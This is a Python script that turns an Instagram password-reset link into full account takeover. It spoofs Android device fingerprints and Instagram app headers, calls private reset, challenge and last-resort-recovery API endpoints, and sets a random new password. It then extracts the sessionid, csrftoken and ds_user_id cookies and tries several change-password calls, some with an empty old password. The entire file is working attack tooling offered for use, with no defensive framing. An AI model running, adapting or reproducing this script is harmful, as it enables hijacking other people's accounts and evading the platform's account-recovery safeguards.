import requests
import uuid
import random
import time
import json
import datetime
import re
import string
from urllib.parse import urlparse, parse_qs

# Owner: boba
BLOKS_VER = "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd"

def generate_device_info():
    devices = [
        {'android': '35/15', 'dpi': '420dpi', 'res': '1080x2400', 'brand': 'samsung', 'model': 'SM-G991U', 'cpu': 'qcom', 'codename': 'o1q'},
        {'android': '35/15', 'dpi': '480dpi', 'res': '1080x2400', 'brand': 'samsung', 'model': 'SM-G998B', 'cpu': 'qcom', 'codename': 'p3s'},
        {'android': '35/15', 'dpi': '440dpi', 'res': '1080x2400', 'brand': 'google', 'model': 'Pixel-7', 'cpu': 'google', 'codename': 'panther'},
    ]
    device = random.choice(devices)
    return {
        'android_id': f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}",
        'ig_device_id': str(uuid.uuid4()),
        'family_device_id': str(uuid.uuid4()),
        'conn_uuid': ''.join(random.choices(string.hexdigits.lower(), k=32)),
        'device': device,
    }

def make_headers(dev, mid=""):
    device = dev['device']
    ua = f"Instagram 367.0.0.43.91 Android ({device['android']}; {device['dpi']}; {device['res']}; {device['brand']}; {device['model']}; {device['codename']}; {device['cpu']}; en_US; {random.randint(300000000, 399999999)})"
    now = time.time()
    h = {
        'User-Agent': ua,
        'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
        'accept-language': "en-US",
        'ig-intended-user-id': "0",
        'x-bloks-is-layout-rtl': "false",
        'x-bloks-prism-button-version': "CONTROL",
        'x-bloks-prism-colors-enabled': "true",
        'x-bloks-version-id': BLOKS_VER,
        'x-fb-client-ip': "True",
        'x-fb-connection-type': "WIFI",
        'x-fb-server-cluster': "True",
        'x-ig-android-id': dev['android_id'],
        'x-ig-app-id': "567067343352427",
        'x-ig-app-locale': "en_US",
        'x-ig-bandwidth-speed-kbps': f"{random.randint(500, 1500)}.000",
        'x-ig-capabilities': "3brTv10=",
        'x-ig-connection-type': "WIFI",
        'x-ig-device-id': dev['ig_device_id'],
        'x-ig-device-locale': "en_US",
        'x-ig-family-device-id': dev['family_device_id'],
        'x-ig-mapped-locale': "en_US",
        'x-ig-nav-chain': f"MainFeedFragment:feed_timeline:1:cold_start:{now}:::",
        'x-ig-timezone-offset': "10800",
        'x-ig-www-claim': "0",
        'x-pigeon-rawclienttime': f"{now}.{random.randint(100,999)}",
        'x-fb-conn-uuid-client': dev['conn_uuid'],
        'x-fb-http-engine': "MNS/TCP",
    }
    if mid:
        h['x-mid'] = mid
    return h, ua

reset_url = input("Reset link:\n> ").strip()
parsed = urlparse(reset_url)
params = parse_qs(parsed.query)
uidb36 = params.get('uidb36', [None])[0]
token = params.get('token', [None])[0]
if not uidb36 or not token:
    print("Invalid link")
    exit()

new_pw = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%&*", k=14))
enc_pw = f"#PWD_INSTAGRAM:0:{int(datetime.datetime.now().timestamp())}:{new_pw}"
dev = generate_device_info()
headers, ua = make_headers(dev)
BK_CTX = json.dumps({"bloks_version": BLOKS_VER, "styles_id": "instagram"})

print(f"\n[*] Password: {new_pw}")
print(f"[*] Device: {dev['device']['brand']} {dev['device']['model']}")

print("\n[1] password_reset...")
r1 = requests.post("https://i.instagram.com/api/v1/accounts/password_reset/",
    headers=headers,
    data={"source": "one_click_login_email", "uidb36": uidb36, "device_id": dev['android_id'],
          "token": token, "waterfall_id": str(uuid.uuid4()), "guid": str(uuid.uuid4()),
          "phone_id": str(uuid.uuid4()), "_uuid": str(uuid.uuid4()), "_csrftoken": "missing"})
print(f"    Status: {r1.status_code}")
if "user_id" not in r1.text:
    print(f"    ERROR: {r1.text[:200]}")
    exit()
j1 = r1.json()
user_id = j1.get('user_id', '')
challenge_context = j1.get('challenge_context', '')
mid = r1.headers.get("Ig-Set-X-Mid", "") or "akgbYAABAAE3EXSBA1-tzpej_vXb"
print(f"    user_id: {user_id}")

print("\n[2] challenge redirect...")
h2 = dict(headers)
h2['x-mid'] = mid
r2 = requests.post("https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.ig.challenge.redirect.async/",
    headers=h2,
    data={"user_id": str(user_id), "cni": "0", "nonce_code": "", "bk_client_context": BK_CTX,
          "challenge_context": str(challenge_context), "bloks_versioning_id": BLOKS_VER, "get_challenge": "true"})
print(f"    Status: {r2.status_code}")
new_mid = r2.headers.get("Ig-Set-X-Mid", "")
if new_mid:
    mid = new_mid
context_data = ""
try:
    ft = r2.json()['layout']['bloks_payload']['ft']
    for k, v in ft.items():
        if 'context_data' in v:
            m = re.search(r'(Q-PTBA[^"]+?\|appr)', v)
            if m:
                context_data = m.group(1)
                break
except:
    pass
if not context_data:
    m = re.search(r'(Q-PTBA[^"]+?\|appr)', r2.text)
    if m:
        context_data = m.group(1)
if not context_data:
    m = re.search(r'(Q-PTBA[^"\\]+?\|[a-z]+)', r2.text)
    if m:
        context_data = m.group(1)
print(f"    context_data: {'OK (' + str(len(context_data)) + ')' if context_data else 'FAILED'}")
if not context_data:
    exit()

print("\n[3] last_resort_recovery (login)...")
h3 = dict(headers)
h3['x-mid'] = mid
params_data = {
    "client_input_params": {"password": enc_pw, "aac": ""},
    "server_params": {"context_data": context_data,
        "INTERNAL__latency_qpl_marker_id": 36707139,
        "INTERNAL__latency_qpl_instance_id": random.randint(100000000000000, 999999999999999)}
}
r3 = requests.post("https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.ap.last_resort_recovery.reset_password.async/",
    headers=h3,
    data={"params": json.dumps(params_data), "bk_client_context": BK_CTX, "bloks_versioning_id": BLOKS_VER})
print(f"    Status: {r3.status_code}")

sessionid = ""
csrf = ""
ds_uid = ""
for cookie in r3.cookies:
    if cookie.name == "sessionid": sessionid = cookie.value
    elif cookie.name == "csrftoken": csrf = cookie.value
    elif cookie.name == "ds_user_id": ds_uid = cookie.value
if not sessionid:
    for h_name in r3.headers:
        h_val = r3.headers[h_name]
        if "sessionid=" in str(h_val):
            sessionid = str(h_val).split("sessionid=")[1].split(";")[0]
        if "csrftoken=" in str(h_val):
            csrf = str(h_val).split("csrftoken=")[1].split(";")[0]
        if "ds_user_id=" in str(h_val):
            ds_uid = str(h_val).split("ds_user_id=")[1].split(";")[0]

print(f"    sessionid: {'OK' if sessionid else 'MISSING'}")
print(f"    csrf: {'OK' if csrf else 'MISSING'}")
print(f"    ds_user_id: {ds_uid or 'MISSING'}")

if not sessionid:
    print("\n    Login failed!")
    print(f"    Password: {new_pw} ")
    print(f"    Response: {r3.text[:300]}")
    exit()

print("\n[4] Attempting password change...")
mob_cookies = {"sessionid": sessionid, "ds_user_id": ds_uid, "csrftoken": csrf}
mob_h = {"User-Agent": ua, "X-IG-App-ID": "567067343352427", "X-CSRFToken": csrf,
         "Content-Type": "application/x-www-form-urlencoded", "x-mid": mid}

endpoints = [
    ("set_password", "https://i.instagram.com/api/v1/accounts/set_password/",
     {"_csrftoken": csrf, "_uid": ds_uid, "_uuid": str(uuid.uuid4()),
      "enc_new_password1": enc_pw, "enc_new_password2": enc_pw}),
    ("change_password (no old)", "https://i.instagram.com/api/v1/accounts/change_password/",
     {"_csrftoken": csrf, "_uid": ds_uid, "_uuid": str(uuid.uuid4()),
      "enc_new_password1": enc_pw, "enc_new_password2": enc_pw}),
    ("change_password (old=empty)", "https://i.instagram.com/api/v1/accounts/change_password/",
     {"_csrftoken": csrf, "_uid": ds_uid, "_uuid": str(uuid.uuid4()),
      "old_password": "", "enc_new_password1": enc_pw, "enc_new_password2": enc_pw}),
    ("change_password (new_password)", "https://i.instagram.com/api/v1/accounts/change_password/",
     {"_csrftoken": csrf, "_uid": ds_uid, "_uuid": str(uuid.uuid4()),
      "old_password": "", "new_password1": new_pw, "new_password2": new_pw}),
]

for name, url, data in endpoints:
    print(f"\n    [{name}]")
    try:
        r = requests.post(url, headers=mob_h, cookies=mob_cookies, data=data, timeout=15)
        print(f"    Status: {r.status_code}")
        print(f"    Body: {r.text[:250]}")
        if r.status_code == 200 and '"status":"ok"' in r.text:
            print(f"\n{'='*50}")
            print(f"  PASSWORD CHANGED: {new_pw}")
            print(f"{'='*50}")
            exit()
    except Exception as e:
        print(f"    Error: {e}")

print(f"\n[!] Could not change password but login succeeded")
print(f"    sessionid: {sessionid[:30]}...")
print(f"    Password: {new_pw} (may not have been changed)")